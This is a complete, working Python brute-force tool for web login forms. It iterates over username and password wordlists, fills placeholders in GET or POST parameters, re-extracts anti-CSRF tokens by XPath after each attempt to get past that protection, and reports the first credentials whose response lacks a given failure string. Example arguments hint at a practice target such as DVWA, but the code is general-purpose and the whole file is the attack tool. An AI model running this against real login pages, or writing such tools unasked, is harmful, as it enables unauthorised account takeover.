#! /usr/bin/python3
import requests
from urllib.request import urlopen
import argparse
from lxml import etree
import os
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--cookies", dest="cookies",
                        help="Cookies: -c PHPSESSID:f8ucrbu0qmta4ettc3208gcvnq& security:low")
    parser.add_argument("-u", "--url", dest="url", help="URL: -u http://127.0.0.1/")
    parser.add_argument("-param", "--param", dest="param",
                        help="Param: -p username:admin; password:123456; OR -p username:^USER^; password:^PASS^")
    parser.add_argument("-l", "--login", dest="login", help="Login: -l admin")
    parser.add_argument("-p", "--password", dest="password", help="Password: -p password")
    parser.add_argument("-L", "--loginlist", dest="loginlist", help="LoginList: -l ~/users.txt")
    parser.add_argument("-P", "--passwordlist", dest="passwordlist", help="Password: -p password")
    parser.add_argument("-C", "--csrfxpath", dest="csrfxpath", help="CSRF-Xpath: //input[@name='user_token']/@value")
    parser.add_argument("-F", "--failedtext", dest="failedtext", help="Failed Login Text: Incorrect password")
    parser.add_argument("-m", "--method", dest="method", help="Method: -m get OR -m POST")
    options = parser.parse_args()
    return options


def deserializer(serialized):
    deserialized = {}
    pairs = serialized.split(";")
    if pairs[-1] == "":
        del pairs[-1]
    for pair in pairs:
        pair = pair.split(":")
        deserialized[pair[0]] = pair[1]
    return deserialized


def send_request(url, params, req_username="", req_password="", req_cookies=None, req_csrf=""):
    """
    This sends the request
    :param url: URL of the application / page
    :param params: parameters to be sent along with request. Serialized String.
    :param req_username: username if any
    :param req_password: password if any
    :param req_cookies: cookies to be sent along with request. DeSerialized Dictionary
    :param req_csrf: CSRF Token
    :param method: GET or POST method
    :return:
    """
    if req_cookies is None:
        req_cookies = {}
    if "^USER^" in params:
        params = params.replace("^USER^", req_username)
    if "^PASS^" in params:
        params = params.replace("^PASS^", req_password)
    if "^CSRF^" in params:
        params = params.replace("^CSRF^", req_csrf)
    params = deserializer(params) if params else {}
    print(f"[*]URL : {url}")
    print("[*]Cookies", req_cookies)
    print("[*]Params", params)
    if METHOD.lower() == "get":
        return requests.get(url, cookies=req_cookies, params=params)
    else:
        return requests.post(url, cookies=req_cookies, data=params)


def get_csrf(latest_response, csrfxpath):
    """
    :param latest_response: response object of login request
    :param csrfxpath: X-Path of element that contains CSRF token value
    :return: CSRF Token found
    """
    with open(os.path.dirname(os.path.realpath(__file__)) + "/out.html", 'w+') as file:
        file.write(latest_response.text)
    tree = etree.parse(urlopen(f'file://{os.path.dirname(os.path.realpath(__file__))}/out.html'), etree.HTMLParser())
    os.remove(os.path.dirname(os.path.realpath(__file__)) + "/out.html")
    try:
        return tree.xpath(csrfxpath)[0]
    except IndexError:
        print("""[-] Default XPath could not retreive CSRF, Please provide one with --csrfxpath.
              \n For e.g. --csrfxpath //input[@name='user_token']/@value
              \n Exiting...""")
        sys.exit()


def gameover(final_username, final_password):
    """
    This is to print first successful credentials
    :param final_username: Successful username / login id
    :param final_password: Successful password
    :return:
    """
    if final_username:
        print(f"[+] Username : {final_username}")
    if final_password:
        print(f"[+] Password : {final_password}")
    print("Exiting...")
    sys.exit()


arguments = get_arguments()

if arguments.method and arguments.method.lower() in ("get","post"):
    METHOD = arguments.method
elif arguments.method:
    print("[-] Please enter valid method. GET or POST.")    
    sys.exit()
else:
    METHOD = "get"


if arguments.url:
    URL = arguments.url
else:
    print("[-] Please provide either URL")
    sys.exit()

if not arguments.csrfxpath:
    arguments.csrfxpath = "//input[contains(@name,'token') and @type='hidden']/@value"

cookies = deserializer(arguments.cookies) if arguments.cookies else {}

arguments.param = "" if not arguments.param else arguments.param

if not arguments.failedtext:
    print("[-] Please provide failed attempt / unsuccessful login text ")
    sys.exit()

if arguments.login:
    username = arguments.login
elif arguments.loginlist:
    username_file_path = os.path.expanduser(arguments.loginlist)
elif "^USER^" in arguments.param:
    print("[-] Please provide either username or username list.")
    sys.exit()
else:
    username = ""


if arguments.password:
    password = arguments.password
elif arguments.passwordlist:
    password_file_path = os.path.expanduser(arguments.passwordlist)
elif "^PASS^" in arguments.param:
    print("[-] Please provide either password or password list.")
    sys.exit()
else:
    password = ""


if "^CSRF^" in arguments.param:
    response = send_request(URL, "", req_cookies=cookies)
    print(response)
    csrf = get_csrf(response, arguments.csrfxpath)
    CSRF = True
else:
    csrf = ""
    CSRF = False

if arguments.loginlist:
    if arguments.passwordlist:
        try:
            with open(password_file_path, 'r') as password_list:
                with open(username_file_path, 'r') as username_list:
                    pw_list = password_list.read().split()
                    uname_list = username_list.read().split()
        except FileNotFoundError as e:
            print(f"[-] Failed List import : {e}")
            sys.exit()

        for uname in uname_list:
            for pw in pw_list:
                response = send_request(URL, arguments.param, uname, pw, cookies, csrf)
                if arguments.failedtext not in response.text:
                    gameover(uname, pw)
                csrf = get_csrf(response, arguments.csrfxpath) if CSRF else ""
    else:
        with open(username_file_path, 'r') as username_list:
            uname_list = username_list.read().split()

        for uname in uname_list:
            response = send_request(URL, arguments.param, uname, password, cookies, csrf)
            if arguments.failedtext not in response.text:
                gameover(uname, password)
            csrf = get_csrf(response, arguments.csrfxpath) if CSRF else ""
else:
    if arguments.passwordlist:
        with open(password_file_path, 'r') as password_list:
            pw_list = password_list.read().split()

        for pw in pw_list:
            response = send_request(URL, arguments.param, username, pw, cookies, csrf)
            if arguments.failedtext not in response.text:
                gameover(username, pw)
            csrf = get_csrf(response, arguments.csrfxpath) if CSRF else ""
    else:
        response = send_request(URL, arguments.param, username, password, cookies, csrf)
        if arguments.failedtext not in response.text:
            gameover(username, password)
